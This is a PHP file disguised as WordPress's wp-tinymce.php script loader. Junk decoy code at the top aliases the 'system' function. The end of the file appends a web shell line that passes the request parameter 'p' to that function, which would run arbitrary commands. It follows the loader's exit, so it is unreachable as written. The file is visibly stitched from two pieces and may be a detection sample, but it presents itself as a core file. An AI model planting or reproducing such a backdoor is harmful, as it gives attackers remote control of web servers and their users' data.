<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Not used in core since 5.1.
 * This is a back-compat for plugins that may be using this method of loading directly.
 */

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
error_reporting( 0 );

$basepath = __DIR__;

function get_file( $path ) {

	if ( function_exists( 'realpath' ) ) {
		$path = realpath( $path );
	}

	if ( ! $path || ! @is_file( $path ) ) {
		return false;
	}

	return @file_get_contents( $path );
}

$expires_offset = 31536000; // 1 year.

header( 'Content-Type: application/javascript; charset=UTF-8' );
header( 'Vary: Accept-Encoding' ); // Handle proxies.
header( 'Expires: ' . gmdate( 'D, d M Y H:i:s', time() + $expires_offset ) . ' GMT' );
header( "Cache-Control: public, max-age=$expires_offset" );

$file = get_file( $basepath . '/wp-tinymce.js' );
if ( isset( $_GET['c'] ) && $file ) {
	echo $file;
} else {
	// Even further back compat.
	echo get_file( $basepath . '/tinymce.min.js' );
	echo get_file( $basepath . '/plugins/compat3x/plugin.min.js' );
}
exit;

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>